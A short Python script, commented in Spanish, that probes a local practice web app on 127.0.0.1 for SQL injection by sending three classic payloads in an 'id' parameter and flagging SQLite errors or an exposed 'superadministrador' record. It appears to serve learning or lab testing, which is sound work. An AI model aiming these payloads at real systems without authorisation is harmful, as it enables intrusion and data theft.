import requests

# URL de nuestra página local de pruebas
target_url = "http://127.0.0.1:5000/"

# Caracteres comunes que rompen consultas SQL mal protegidas
payloads_sqli = [
    "'", 
    "1 OR 1=1", 
    "1' OR '1'='1"
]

print("[*] Iniciando escaneo de vulnerabilidades local...")
print(f"[*] Objetivo: {target_url}\n")

# Comprobar el comportamiento normal de la página primero
try:
    response_normal = requests.get(target_url, params={"id": "1"})
    longitud_normal = len(response_normal.text)
except requests.exceptions.ConnectionError:
    print("[!] ERROR: No se pudo conectar al servidor. ¿Ya encendiste app.py?")
    exit()

# Probar cada payload
for payload in payloads_sqli:
    print(f"[+] Evaluando payload: {payload}")
    
    # Enviamos el payload simulando la acción del usuario
    params = {"id": payload}
    response = requests.get(target_url, params=params)
    
    # Analizamos la respuesta del servidor buscando patrones de fallo
    if "error" in response.text.lower() or "sqlite3.operationalerror" in response.text.lower():
        print(f"  [\033[1;31mCRÍTICO\033[0m] Vulnerabilidad SQLi Detectada por error de sintaxis expuesto.")
        print(f"  --> URL: {response.url}\n")
    elif "superadministrador" in response.text.lower() and payload != "1":
        print(f"  [\033[1;31mCRÍTICO\033[0m] Vulnerabilidad SQLi Confirmada: El payload alteró la lógica.")
        print(f"  --> URL: {response.url}\n")
    else:
        print("  [-] No se detectaron anomalías evidentes con este parámetro.\n")



